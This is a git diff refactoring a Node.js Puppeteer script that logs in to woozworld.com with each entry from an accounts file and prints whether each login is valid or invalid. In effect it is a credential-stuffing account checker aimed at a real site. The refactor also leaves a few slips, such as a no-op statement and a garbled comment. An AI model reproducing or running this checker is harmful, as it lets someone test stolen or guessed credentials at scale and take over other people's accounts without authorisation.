@@ -1,29 +1,29 @@
-//Dependencies
-const Puppeteer = require("puppeteer")
-const Request = require("request")
-const Fs = require("fs")
+"use strict";
 
-//Variables
-const Self_Args = process.argv.slice(2)
+// Dependencies
+const puppeteer = require("puppeteer")
+const fs = require("fs")
 
-//Functions
-async function Main(accounts){
-    const browser = await Puppeteer.launch({ defaultViewport: null, headless: false, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
+// Variables
+const args = process.argv.slice(2)
+
+//F unctions
+async function main(accounts){
+    const browser = await puppeteer.launch({ defaultViewport: null, headless: false, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
     const page = await browser.newPage()
 
     await page.goto("https://www.woozworld.com/", { waitUntil: "domcontentloaded" })
     
-    var account_index = 0
+    var accountIndex = 0
 
-    Checker()
-    async function Checker(){
-        if(accounts.length == account_index){
+    async function checker(){
+        if(accounts.length === accountIndex){
             console.log("Finished checking.")
             await browser.close()
             process.exit()
         }
 
-        const account = accounts[account_index]
+        const account = accounts[accountIndex]
 
         await page.evaluate(()=>{
             document.querySelector("#forms--login > div:nth-of-type(1) > input[type=text]:nth-of-type(1)").value = ""
@@ -38,48 +38,32 @@ async function Main(accounts){
             const SI = setInterval(function(){
                 const waitfor = document.getElementsByClassName("messg messg-error")
 
-                if(waitfor != undefined && waitfor != ""){
+                if(waitfor){
                     clearInterval(SI)
 
-                    return waitfor
+                    waitfor
                 }
             }, 1000)
         })
 
         await page.waitForTimeout(1000)
-        const page_content = await page.content()
+        const pageContent = await page.content()
 
-        console.log(page_content.indexOf("Incorrect email and/or password."))
-        if(page_content.indexOf("Incorrect email and/or password.") != -1){
-            console.log(`Invalid account ${account}`)
-        }else{
-            console.log(`Valid account ${account}`)
-        }
+       pageContent.match("Incorrect email and/or password.") ? console.log(`Invalid account ${account}`) : console.log(`Valid account ${account}`)
 
-        account_index += 1
-        Checker()
-        return
+        accountIndex++
+        checker()
     }
+
+    checker()
 }
 
-//Main
-if(!Self_Args.length){
-    console.log(`node index.js <input>
-Example: node index.js example_accounts.txt`)
-    process.exit()
-}
+// Main
+if(!args.length) return console.log("node index.js <accountsFile>")
 
-if(!Fs.existsSync(Self_Args[0])){
-    console.log("Invalid input.")
-    process.exit()
-}
+const accounts = fs.readFileSync(args[0], "utf8").split("\n")
 
-const Accounts = Fs.readFileSync(Self_Args[0], "utf8").split("\n")
+if(!accounts) return console.log("File is empty.")
 
-if(!Accounts){
-    console.log("File is empty.")
-    process.exit()
-}
-
-console.log(`${Accounts.length} accounts found.`)
-Main(Accounts)
+console.log(`${accounts.length} accounts found.`)
+main(accounts)
